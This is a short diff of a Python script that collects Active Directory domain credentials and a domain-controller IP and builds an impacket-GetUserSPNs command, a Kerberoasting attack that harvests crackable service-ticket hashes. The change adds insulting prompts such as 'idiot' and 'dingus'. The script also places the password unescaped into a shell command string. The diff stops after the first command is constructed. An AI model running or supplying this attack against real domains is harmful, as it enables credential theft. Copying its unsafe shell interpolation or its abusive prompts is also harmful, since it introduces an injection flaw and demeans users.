@@ -1,10 +1,12 @@
+#!/usr/bin/env python3
+
 import subprocess
 
 # Get user input
-domain = input("Enter the domain: ")
-user = input("Enter the username: ")
-password = input("Enter the password: ")
-ip = input("Enter the IP address: ")
+domain = input("Enter the domain, idiot: ")
+user = input("Enter the username, dingus: ")
+password = input("Enter the password, Einstein: ")
+ip = input("Enter the IP address, idiot again: ")
 
 # Construct the commands
 command1 = f"impacket-GetUserSPNs {domain}/{user}:'{password}' -dc-ip {ip}"
